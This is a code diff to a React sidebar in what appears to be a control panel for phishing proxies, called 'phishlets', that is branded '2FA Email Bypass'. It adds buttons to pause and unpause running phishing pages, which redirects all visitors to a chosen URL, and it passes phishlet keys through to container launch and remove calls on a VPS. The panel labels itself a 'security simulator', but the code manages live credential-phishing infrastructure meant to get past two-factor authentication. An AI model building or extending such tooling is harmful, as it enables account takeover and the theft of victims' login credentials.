@@ -200,13 +200,16 @@ function PhishletSettingsModal({ phishlet, onClose, onRun }) {
   )
 }
 
-export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemoved, onClose }) {
+export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemoved, onPauseToggle, onClose }) {
   const { user, logout } = useAuth()
   const [showPhishlets, setShowPhishlets] = useState(false)
   const [phishlets, setPhishlets] = useState([])
   const [phishletFetching, setPhishletFetching] = useState(false)
   const [phishletError, setPhishletError] = useState('')
   const [settingsPhishlet, setSettingsPhishlet] = useState(null)
+  const [pausingPhishlet, setPausingPhishlet] = useState(null)
+  const [pauseUrl, setPauseUrl] = useState('')
+  const [pausing, setPausing] = useState(false)
   const phishletRef = useRef(null)
 
   useEffect(() => {
@@ -238,23 +241,68 @@ export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemo
       p.then((data) => {
         if (data && data.status === 'success') {
           setTimeout(() => {
-            onOpenBrowser(`http://${import.meta.env.VITE_VPS_IP || '127.0.0.1'}:${port}`, label)
+            onOpenBrowser(`http://${import.meta.env.VITE_VPS_IP || '127.0.0.1'}:${port}`, label, key)
           }, 4000)
         }
       })
     }
   }
 
-  const handlePhishletOpen = (url, label) => {
+  const handlePhishletOpen = (url, label, key) => {
     setShowPhishlets(false)
-    onOpenBrowser(url, label)
+    onOpenBrowser(url, label, key)
   }
 
-  const handlePhishletRemove = (name, label, port) => {
+  const handlePhishletRemove = (name, label, port, key) => {
     setShowPhishlets(false)
     onRun(`Remove ${label}`, `/api/containers/remove`, { name }).then(() => {
       onContainerRemoved(port)
+      axios.post(`${BASE}/api/phishlets/${key}/unpause`, {}, { headers: authHeaders() }).catch(() => {})
     })
+  }
+
+  const handlePhishletPause = (key, label) => {
+    setPausingPhishlet({ key, label })
+    setPauseUrl('')
+  }
+
+  const confirmPause = () => {
+    if (!pausingPhishlet || !pauseUrl.trim()) return
+    setPausing(true)
+    axios
+      .post(
+        `${BASE}/api/phishlets/${pausingPhishlet.key}/pause`,
+        { redirect_url: pauseUrl.trim() },
+        { headers: authHeaders() }
+      )
+      .then(() => {
+        onPauseToggle(pausingPhishlet.key, pauseUrl.trim())
+        setPausingPhishlet(null)
+        setPauseUrl('')
+        setShowPhishlets(true)
+      })
+      .catch((err) => {
+        alert(err.response?.data?.detail || err.message)
+      })
+      .finally(() => setPausing(false))
+  }
+
+  const handlePhishletUnpause = (key, label, port) => {
+    setShowPhishlets(false)
+    axios
+      .post(
+        `${BASE}/api/phishlets/${key}/unpause`,
+        {},
+        { headers: authHeaders() }
+      )
+      .then(() => {
+        const originalUrl = `http://${import.meta.env.VITE_VPS_IP || '127.0.0.1'}:${port}`
+        onPauseToggle(key, originalUrl)
+        setShowPhishlets(true)
+      })
+      .catch((err) => {
+        alert(err.response?.data?.detail || err.message)
+      })
   }
 
   const handleRebuildImage = () => {
@@ -266,7 +314,7 @@ export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemo
       <div className="px-4 py-5 border-b border-gray-800 flex items-center justify-between">
         <div>
           <h1 className="text-lg font-bold text-green-400 tracking-widest drop-shadow-[0_0_6px_rgba(34,197,94,0.4)]">
-            {import.meta.env.VITE_APP_NAME || 'BTB_ATTACK'}
+            {import.meta.env.VITE_APP_NAME || '2FA Email Bypass'}
           </h1>
           <p className="text-[10px] text-gray-600 mt-0.5">v1.0 — security simulator</p>
         </div>
@@ -317,7 +365,8 @@ export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemo
                   >
                     <div className="flex items-center justify-between mb-1">
                       <span className="text-xs font-medium text-gray-200">
-                        {p.running ? '🟢' : '🔴'} {p.label}
+                        {p.running ? (p.paused ? '⏸' : '🟢') : '🔴'} {p.label}
+                        {p.paused && <span className="text-yellow-400 ml-1 text-[10px]">paused</span>}
                       </span>
                       <span className="text-[10px] text-gray-500">:{p.port}</span>
                     </div>
@@ -332,13 +381,28 @@ export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemo
                       ) : (
                         <>
                           <button
-                            onClick={() => handlePhishletOpen(`http://${import.meta.env.VITE_VPS_IP || '127.0.0.1'}:${p.port}`, p.label)}
+                            onClick={() => handlePhishletOpen(`http://${import.meta.env.VITE_VPS_IP || '127.0.0.1'}:${p.port}`, p.label, p.key)}
                             className="text-[10px] px-2 py-0.5 rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition"
                           >
                             Open
                           </button>
+                          {p.paused ? (
+                            <button
+                              onClick={() => handlePhishletUnpause(p.key, p.label, p.port)}
+                              className="text-[10px] px-2 py-0.5 rounded bg-yellow-700 text-yellow-200 hover:bg-yellow-600 transition"
+                            >
+                              Unpause
+                            </button>
+                          ) : (
+                            <button
+                              onClick={() => handlePhishletPause(p.key, p.label)}
+                              className="text-[10px] px-2 py-0.5 rounded bg-amber-700 text-amber-200 hover:bg-amber-600 transition"
+                            >
+                              Pause
+                            </button>
+                          )}
                           <button
-                            onClick={() => handlePhishletRemove(p.name, p.label, p.port)}
+                            onClick={() => handlePhishletRemove(p.name, p.label, p.port, p.key)}
                             className="text-[10px] px-2 py-0.5 rounded bg-red-800 text-red-200 hover:bg-red-700 transition"
                           >
                             Remove
@@ -391,6 +455,59 @@ export default function Sidebar({ onRun, loading, onOpenBrowser, onContainerRemo
           onClose={() => setSettingsPhishlet(null)}
           onRun={onRun}
         />
+      ), document.body)}
+
+      {createPortal(pausingPhishlet && (
+        <div
+          className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
+          onClick={() => setPausingPhishlet(null)}
+        >
+          <div
+            className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-sm"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
+              <h2 className="text-sm font-bold text-amber-300">
+                Pause {pausingPhishlet.label}
+              </h2>
+              <button
+                onClick={() => setPausingPhishlet(null)}
+                className="text-gray-500 hover:text-red-400 text-lg leading-none"
+              >
+                ×
+              </button>
+            </div>
+            <div className="px-4 py-4 space-y-3">
+              <p className="text-xs text-gray-400">
+                All visitors will be redirected to this URL instead of the phishlet page.
+              </p>
+              <input
+                type="text"
+                value={pauseUrl}
+                onChange={(e) => setPauseUrl(e.target.value)}
+                placeholder="https://example.com"
+                className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-amber-500"
+                autoFocus
+                onKeyDown={(e) => { if (e.key === 'Enter') confirmPause() }}
+              />
+              <div className="flex gap-2 justify-end">
+                <button
+                  onClick={() => setPausingPhishlet(null)}
+                  className="px-3 py-1.5 text-xs rounded bg-gray-700 text-gray-300 hover:bg-gray-600 transition"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={confirmPause}
+                  disabled={pausing || !pauseUrl.trim()}
+                  className="px-3 py-1.5 text-xs rounded bg-amber-700 text-amber-100 hover:bg-amber-600 transition disabled:opacity-40"
+                >
+                  {pausing ? 'Pausing...' : 'Pause'}
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
       ), document.body)}
     </aside>
   )
